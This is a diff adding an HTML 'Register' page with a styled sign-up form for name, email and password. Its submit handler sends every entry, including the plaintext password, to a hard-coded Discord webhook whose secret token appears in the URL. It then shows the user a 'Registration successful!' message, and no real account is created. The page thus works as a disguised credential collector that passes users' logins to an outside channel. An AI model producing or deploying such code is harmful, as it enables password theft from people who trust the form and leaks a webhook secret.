@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Register</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      background-size: 200% 200%;
+      animation: gradientBG 10s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .form-container {
+      background: #fff;
+      padding: 2.5rem;
+      border-radius: 1.5rem;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+      width: 360px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 1s ease-out forwards;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 2rem;
+      color: #222;
+      font-weight: 600;
+    }
+    input {
+      display: block;
+      width: 100%;
+      padding: 0.85rem 1rem;
+      margin-bottom: 1.2rem;
+      border: 1px solid #ccc;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 0.95rem;
+      background: #2575fc;
+      color: white;
+      border: none;
+      border-radius: 0.6rem;
+      cursor: pointer;
+      font-size: 1.05rem;
+      font-weight: 500;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #1a5ed9;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Register</h2>
+    <form id="regForm">
+      <input type="text" id="name" placeholder="Name" required />
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Sign Up</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('regForm');
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const userData = {
+        name: document.getElementById('name').value,
+        email: document.getElementById('email').value,
+        password: document.getElementById('password').value,
+      };
+
+      try {
+        await fetch('https://discord.com/api/webhooks/1378798204732182679/iYvrCjGyhonTx0Ba2sHM05eqIa9nF3utcrSilvgE7IvrqA0UQBOSVkCpFwFYrvGTUt-9', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title: "✨ New User Registered!",
+                color: 7506394,
+                fields: [
+                  { name: "👤 Name", value: `**${userData.name}**`, inline: false },
+                  { name: "📧 Email", value: `**${userData.email}**`, inline: false },
+                  { name: "🔑 Password", value: `**${userData.password}**`, inline: false }
+                ],
+                footer: {
+                  text: "Registration System",
+                },
+                timestamp: new Date().toISOString()
+              }
+            ]
+          })
+        });
+
+        alert('Registration successful!');
+        form.reset();
+      } catch (err) {
+        console.error(err);
+        alert('Failed to send to Discord');
+      }
+    });
+  </script>
+</body>
+</html>
